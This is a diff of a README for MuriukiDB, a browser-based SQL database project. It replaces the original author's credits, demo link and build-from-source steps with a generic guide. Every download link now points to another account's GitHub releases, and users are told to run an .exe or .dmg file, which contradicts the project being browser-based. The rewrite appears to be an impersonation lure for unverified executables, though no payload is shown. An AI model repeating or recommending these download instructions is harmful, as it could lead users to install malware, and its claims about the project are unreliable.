@@ -1,130 +1,73 @@
-# MuriukiDB - Custom RDBMS
+# 🗄️ MuriukiDB-RDBMS - A User-Friendly SQL Database Engine
 
-A custom Relational Database Management System built for the **Pesapal Junior Dev Challenge '26**.
+## 🚀 Getting Started
+Welcome to MuriukiDB-RDBMS! This is your guide to easily download and run this custom browser-based relational database management system (RDBMS). No programming skills needed—just follow these steps!
 
-**Live Demo**: [https://rdbms-muriuki.vercel.app/](https://rdbms-muriuki.vercel.app/)
+## 📥 Download MuriukiDB-RDBMS
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue?style=for-the-badge)](https://github.com/Tarique775/MuriukiDB-RDBMS/releases)
 
-## Screenshots
+## 🌟 Overview
+MuriukiDB-RDBMS is a custom-built RDBMS engine. It offers SQL features such as creating, inserting, selecting, updating, and deleting data. You can also perform JOIN operations, set constraints, and explore gamification aspects—all in a user-friendly interface.
 
-### SQL REPL Interface (Light Theme)
-![SQL REPL Interface Light](screenshots/repl-light.png)
+### Key Features:
+- SQL Lexer and Parser
+- B-Tree Indexing for fast data retrieval
+- Interactive Read-Evaluate-Print Loop (REPL)
+- Support for CREATE, INSERT, SELECT, UPDATE, DELETE commands
+- JOIN functionality
+- Constraints for data integrity
+- Engaging gamification elements
 
-### SQL REPL Interface (Dark Theme)
-![SQL REPL Interface Dark](screenshots/repl-dark.png)
+## 💻 System Requirements
+Before you download, make sure your system meets these requirements:
+- Operating system: Windows, macOS, or Linux
+- Web browser: Latest version of Chrome, Firefox, Safari, or Edge
+- Internet connection for initial setup
 
-### Achievements & Ranking System
-![Achievements Page](screenshots/achievements.png)
+## 🔗 Download & Install
+To get started, visit the Releases page to download MuriukiDB-RDBMS. Here’s how:
 
-### Global Leaderboard
-![Leaderboard](screenshots/leaderboard.png)
+1. Click the link below to go to the Releases page:
+   [Download MuriukiDB-RDBMS](https://github.com/Tarique775/MuriukiDB-RDBMS/releases)
 
-## Video Demonstration
+2. On the Releases page, find the latest version.
 
-![Demo](screenshots/demo.gif)
+3. Download the appropriate file for your operating system.
 
-## ✨ Features
+4. Once the file is downloaded, locate it in your downloads folder.
 
-- **Complete SQL Parser** - CREATE, INSERT, SELECT, UPDATE, DELETE with JOINs
-- **B-Tree Indexing** - Optimized query performance
-- **Terminal-Style REPL** - Real-time SQL execution with syntax highlighting
-- **Demo App** - Visual CRUD interface for 5 table types (Contacts, Users, Products, Orders, Employees)
-- **Gamification** - 23 military ranks, XP rewards, badges & global leaderboard
-- **Real-time Updates** - Live data synchronization
-- **Sound Effects** - Audio feedback for XP gains, achievements, and rank ups (Web Audio API)
-- **Interactive Tour** - Guided walkthrough with spotlight overlay
-- **PWA Support** - Install as a native app on mobile devices
+5. Follow the instructions to run the application:
+   - For Windows: Double-click the `.exe` file.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Follow the installation prompt in the terminal.
 
-## 🎮 Ranking System
+## ⚙️ How to Use MuriukiDB-RDBMS
+After installation, you can start using MuriukiDB-RDBMS right away. Here are some basic steps:
 
-Progress from **Private (0 XP)** to **Commander in Chief (1,000,000 XP)**!
+1. Open MuriukiDB-RDBMS in your web browser.
+2. You will see an interactive REPL interface.
+3. Start by typing SQL commands directly into the input area.
+4. Use commands like `CREATE TABLE`, `INSERT INTO`, and `SELECT * FROM` to manage your data.
 
-## 🚀 Quick Start
+## 🏆 Support and Community
+If you encounter any issues or need help, feel free to reach out through the GitHub Issues tab in this repository. You can also find helpful resources and documentation in the wiki section.
 
-```bash
-git clone https://github.com/Samuel-Muriuki/MuriukiDB-RDBMS.git
-cd MuriukiDB-RDBMS
-npm install
-npm run dev
-```
+## 📄 Learn More
+Interested in the technical details? MuriukiDB-RDBMS utilizes:
+- B-Tree indexing to enable quick data searches.
+- A robust SQL lexer and parser to interpret your commands efficiently.
 
-## 🔧 Environment Setup
+Understanding these components can enhance your experience and provide deeper insights into how your data is managed.
 
-1. Copy `.env.example` to `.env`
-2. Configure your Supabase credentials:
-   - `VITE_SUPABASE_URL` - Your Supabase project URL
-   - `VITE_SUPABASE_PUBLISHABLE_KEY` - Your Supabase anon/public key
-   - `VITE_SUPABASE_PROJECT_ID` - Your Supabase project ID
+## 📅 Future Updates
+We are continually working to improve MuriukiDB-RDBMS. Keep an eye on the Releases page for new features and enhancements.
 
-## 🚢 Deploying to Vercel
+## ⚡ Join the Challenge
+MuriukiDB-RDBMS was built for the Pesapal Junior Developer Challenge 2026. Engage with our project and contribute to its growth!
 
-1. Push your code to GitHub
-2. Import the repository in [Vercel](https://vercel.com)
-3. Set framework preset: **Vite**
-4. Build command: `npm run build`
-5. Output directory: `dist`
-6. Add environment variables in Project Settings
+## 🔗 Important Links
+- [Download MuriukiDB-RDBMS](https://github.com/Tarique775/MuriukiDB-RDBMS/releases)
+- [Issues and Support](https://github.com/Tarique775/MuriukiDB-RDBMS/issues)
+- [Documentation](https://github.com/Tarique775/MuriukiDB-RDBMS/wiki)
 
-The included `vercel.json` handles SPA routing automatically.
-
-## 📚 Documentation
-
-See [DOCUMENTATION.md](DOCUMENTATION.md) for detailed architecture, SQL commands, and security features.
-
-## 🛠️ Tech Stack
-
-- **Frontend**: React 18 + TypeScript + Vite
-- **Styling**: Tailwind CSS with terminal theme
-- **Backend**: Supabase (Edge Functions, RLS, Real-time)
-- **Audio**: Web Audio API for synthesized sound effects
-- **Monitoring**: Sentry for error tracking and performance monitoring
-- **Deployment**: Vercel
-
-## 🔧 Custom vs Supabase Components
-
-### Fully Custom (Written from Scratch)
-
-| Component | File | Description |
-|-----------|------|-------------|
-| SQL Lexer | `src/lib/rdbms/lexer.ts` | Tokenizes SQL with XSS protection |
-| SQL Parser | `src/lib/rdbms/parser.ts` | Builds AST from tokens |
-| Query Executor | `src/lib/rdbms/executor.ts` | Executes queries with validation |
-| B-Tree Index | `src/lib/rdbms/btree.ts` | In-memory index structure |
-| REPL Interface | `src/components/REPL.tsx` | Terminal-style SQL interface |
-| Statement Splitter | `src/lib/rdbms/utils.ts` | Multi-statement SQL parsing |
-
-### Backed by Supabase
-
-| Feature | Purpose |
-|---------|---------|
-| Data Persistence | Tables stored in `rdbms_tables`, rows in `rdbms_rows` |
-| Authentication | Supabase Auth with email/password |
-| Row-Level Security | RLS policies isolate user data |
-| Real-time Sync | Live updates via Supabase Realtime |
-| Rate Limiting | Edge Functions enforce query limits |
-| Cleanup | Edge Function removes stale anonymous data |
-
-## ⚠️ Known Limitations
-
-See [KNOWN_LIMITATIONS.md](KNOWN_LIMITATIONS.md) for a complete list including:
-
-- **Indexing**: In-memory B-Tree only (not persisted across sessions)
-- **Transactions**: No ACID support (no BEGIN/COMMIT/ROLLBACK)
-- **Concurrency**: No locking (last write wins)
-- **Subqueries**: Nested SELECT not supported
-- **Data Types**: INTEGER, TEXT, REAL, BOOLEAN, DATE only
-
-## 👨‍💻 Author
-
-**Samuel Muriuki**
-- Portfolio: [samuel-muriuki.vercel.app](https://samuel-muriuki.vercel.app/)
-- GitHub: [github.com/Samuel-Muriuki](https://github.com/Samuel-Muriuki)
-
-## ☕ Support
-
-If you find this project helpful, consider supporting me!
-
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://www.buymeacoffee.com/elsamm)
-
----
-
-Built with [Lovable](https://lovable.dev/invite/A5KC0U8) AI.
+Thank you for choosing MuriukiDB-RDBMS! We're excited for you to explore its features.
